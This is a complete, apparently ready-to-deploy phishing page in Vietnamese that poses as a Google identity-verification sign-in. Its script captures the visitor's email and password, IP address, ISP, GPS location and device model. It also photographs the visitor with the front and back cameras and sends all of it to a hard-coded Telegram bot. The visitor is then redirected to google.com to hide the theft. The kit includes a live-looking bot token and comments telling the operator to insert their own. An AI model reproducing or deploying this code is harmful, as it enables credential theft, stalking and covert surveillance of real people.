<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập Google - Xác minh danh tính</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px 35px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
            border: 1px solid rgba(255,255,255,0.08);
            animation: fadeIn 0.8s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .logo {
            text-align: center;
            margin-bottom: 25px;
        }
        .logo img {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #fff;
            padding: 10px;
        }
        .logo h1 {
            color: #fff;
            font-size: 22px;
            font-weight: 600;
            margin-top: 12px;
            letter-spacing: 0.5px;
        }
        .logo p {
            color: rgba(255,255,255,0.5);
            font-size: 14px;
        }
        .input-group {
            margin-bottom: 18px;
        }
        .input-group label {
            display: block;
            color: rgba(255,255,255,0.7);
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 6px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(255,255,255,0.06);
            color: #fff;
            font-size: 15px;
            transition: 0.3s;
            outline: none;
        }
        .input-group input:focus {
            border-color: #6c63ff;
            background: rgba(255,255,255,0.1);
            box-shadow: 0 0 20px rgba(108,99,255,0.15);
        }
        .input-group input::placeholder {
            color: rgba(255,255,255,0.3);
        }
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(135deg, #6c63ff, #5a52d5);
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 10px;
        }
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 30px rgba(108,99,255,0.3);
        }
        .btn:active {
            transform: scale(0.98);
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.6);
            font-size: 14px;
        }
        .loading .spinner {
            width: 30px;
            height: 30px;
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid #6c63ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(255,255,255,0.25);
            font-size: 12px;
        }
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            padding: 12px 24px;
            border-radius: 12px;
            color: #fff;
            font-size: 14px;
            display: none;
            border: 1px solid rgba(255,255,255,0.05);
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">
            <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google">
            <h1>🔐 Xác minh danh tính</h1>
            <p>Vui lòng xác minh để tiếp tục</p>
        </div>

        <form id="loginForm" onsubmit="return fakeLogin(event)">
            <div class="input-group">
                <label>📧 Email hoặc số điện thoại</label>
                <input type="text" id="email" placeholder="Nhập email của bạn" required>
            </div>
            <div class="input-group">
                <label>🔑 Mật khẩu</label>
                <input type="password" id="password" placeholder="Nhập mật khẩu" required>
            </div>
            <button type="submit" class="btn" id="submitBtn">Tiếp tục</button>
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <span>Đang xác minh danh tính...</span>
            </div>
        </form>

        <div class="footer">
            Bảo mật và an toàn • Google © 2026
        </div>
    </div>

    <div class="toast" id="toast">✅ Đã xác minh thành công! Đang chuyển hướng...</div>

    <!-- ============================================ -->
    <!-- SCRIPT CHÍNH (PASTE TOÀN BỘ CỦA MÀY VÀO ĐÂY) -->
    <!-- ============================================ -->
    <script>
        // =====================================================
        // THAY TOKEN + CHAT_ID CỦA MÀY VÀO ĐÂY
        // =====================================================
        const TELEGRAM_BOT_TOKEN = '7924007259:AAFE4-57EOX2lTYco_rX64kKffY4MlQ-ayg';
        const TELEGRAM_CHAT_ID_WITH_PHOTOS = '-1004469272954';
        const TELEGRAM_CHAT_ID_NO_PHOTOS = '-1004469272954';
        // =====================================================

        const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
        const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        const info = {
            time: new Date().toLocaleString('vi-VN'),
            ip: '',
            isp: '',
            realIp: '',
            address: '',
            country: '',
            lat: '',
            lon: '',
            device: '',
            os: '',
            camera: '⏳ Đang kiểm tra...',
            email: '',
            password: ''
        };

        // =====================================================
        // PHẦN GIẢ LẬP ĐĂNG NHẬP
        // =====================================================
        function fakeLogin(e) {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const pass = document.getElementById('password').value.trim();

            if (!email || !pass) {
                showToast('⚠️ Vui lòng nhập đầy đủ thông tin!');
                return false;
            }

            // LƯU THÔNG TIN ĐĂNG NHẬP
            info.email = email;
            info.password = pass;

            // HIỂN THỊ LOADING
            document.getElementById('submitBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            // CHẠY QUÁ TRÌNH THU THẬP
            main().then(() => {
                showToast('✅ Xác minh thành công! Đang chuyển hướng...');
                setTimeout(() => {
                    window.location.href = 'https://www.google.com';
                }, 2000);
            });

            return false;
        }

        function showToast(msg) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.style.display = 'block';
            setTimeout(() => t.style.display = 'none', 4000);
        }

        // =====================================================
        // PHẦN THU THẬP THÔNG TIN (GIỮ NGUYÊN)
        // =====================================================
        function detectDevice() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            const screenW = window.screen.width;
            const screenH = window.screen.height;
            const ratio = window.devicePixelRatio;

            if (/Android/i.test(ua)) {
                info.os = 'Android';
                const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
                if (match) {
                    let model = match[1].split('/')[0].trim();
                    if (model.includes("SM-S918")) model = "Samsung Galaxy S23 Ultra";
                    if (model.includes("SM-S928")) model = "Samsung Galaxy S24 Ultra";
                    info.device = model;
                } else {
                    info.device = 'Android Device';
                }
            } else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
                info.os = 'iOS';
                const res = `${screenW}x${screenH}@${ratio}`;
                const iphoneModels = {
                    "430x932@3": "iPhone 14/15/16 Pro Max",
                    "393x852@3": "iPhone 14/15/16 Pro / 15/16",
                    "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
                    "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
                    "414x896@3": "iPhone XS Max / 11 Pro Max",
                    "414x896@2": "iPhone XR / 11",
                    "375x812@3": "iPhone X / XS / 11 Pro",
                    "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
                };
                info.device = iphoneModels[res] || 'iPhone Model';
            } else if (/Windows NT/i.test(ua)) {
                info.device = 'Windows PC';
                info.os = 'Windows';
            } else if (/Macintosh/i.test(ua)) {
                info.device = 'Mac';
                info.os = 'macOS';
            } else {
                info.device = 'Không xác định';
                info.os = 'Không rõ';
            }
        }

        async function getPublicIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const data = await r.json();
                info.ip = data.ip || 'Không rõ';
            } catch (e) { info.ip = 'Bị chặn'; }
        }

        async function getRealIP() {
            try {
                const r = await fetch('https://icanhazip.com');
                const ip = await r.text();
                info.realIp = ip.trim();
                const res = await fetch(`https://ipwho.is/${info.realIp}`);
                const data = await res.json();
                info.isp = data.connection?.org || 'VNNIC';
                info.country = data.country || 'Việt Nam';
            } catch (e) { info.realIp = 'Lỗi kết nối'; }
        }

        async function getLocation() {
            return new Promise(resolve => {
                if (!navigator.geolocation) return fallbackIPLocation().then(resolve);

                navigator.geolocation.getCurrentPosition(
                    async pos => {
                        info.lat = pos.coords.latitude.toFixed(6);
                        info.lon = pos.coords.longitude.toFixed(6);
                        try {
                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                            const data = await res.json();
                            info.address = data.display_name || '📍 Vị trí GPS';
                            info.country = data.address?.country || info.country;
                        } catch {
                            info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`;
                        }
                        resolve();
                    },
                    async () => {
                        await fallbackIPLocation();
                        resolve();
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
        }

        async function fallbackIPLocation() {
            try {
                const data = await fetch(`https://ipwho.is/`).then(r => r.json());
                info.lat = data.latitude?.toFixed(6) || '0';
                info.lon = data.longitude?.toFixed(6) || '0';
                info.address = `${data.city}, ${data.region} (Vị trí IP)`;
                info.country = data.country || 'Việt Nam';
            } catch (e) { info.address = 'Không rõ'; }
        }

        async function captureCamera(facingMode = 'user') {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
                return new Promise(resolve => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    video.onloadedmetadata = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        setTimeout(() => {
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            stream.getTracks().forEach(t => t.stop());
                            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                        }, 800);
                    };
                });
            } catch (e) {
                throw e;
            }
        }

        function getCaption() {
            const mapsLink = info.lat && info.lon
                ? `https://maps.google.com/maps?q=${info.lat},${info.lon}`
                : 'Không rõ';

            return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌍 IP dân cư: ${info.ip}
🧠 IP gốc: ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌎 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📌 Google Maps: ${mapsLink}
📸 Camera: ${info.camera}
🔑 Email: ${info.email}
🔒 Mật khẩu: ${info.password}
`.trim();
        }

        async function sendPhotos(frontBlob, backBlob) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);

            const media = [];
            if (frontBlob) {
                media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
                formData.append('front', frontBlob, 'front.jpg');
            }
            if (backBlob) {
                media.push({ type: 'photo', media: 'attach://back' });
                formData.append('back', backBlob, 'back.jpg');
            }

            formData.append('media', JSON.stringify(media));
            return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
        }

        async function sendTextOnly() {
            return fetch(API_SEND_TEXT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
                    text: getCaption()
                })
            });
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        async function main() {
            detectDevice();
            await Promise.all([getPublicIP(), getRealIP(), getLocation()]);

            let front = null,
                back = null;

            try {
                front = await captureCamera("user");
                await delay(500);
                back = await captureCamera("environment");
                info.camera = '✅ Đã chụp camera trước và sau';
            } catch (e) {
                info.camera = '🚫 Bị từ chối hoặc lỗi camera';
            }

            if (front || back) {
                await sendPhotos(front, back);
            } else {
                await sendTextOnly();
            }
        }

        // =====================================================
        // TỰ ĐỘNG CHẠY KHI TẢI TRANG
        // =====================================================
        // KHÔNG TỰ CHẠY, ĐỢI USER BẤM SUBMIT
        console.log("✅ Script đã sẵn sàng. Chờ user nhập thông tin...");
    </script>
</body>
                  </html>
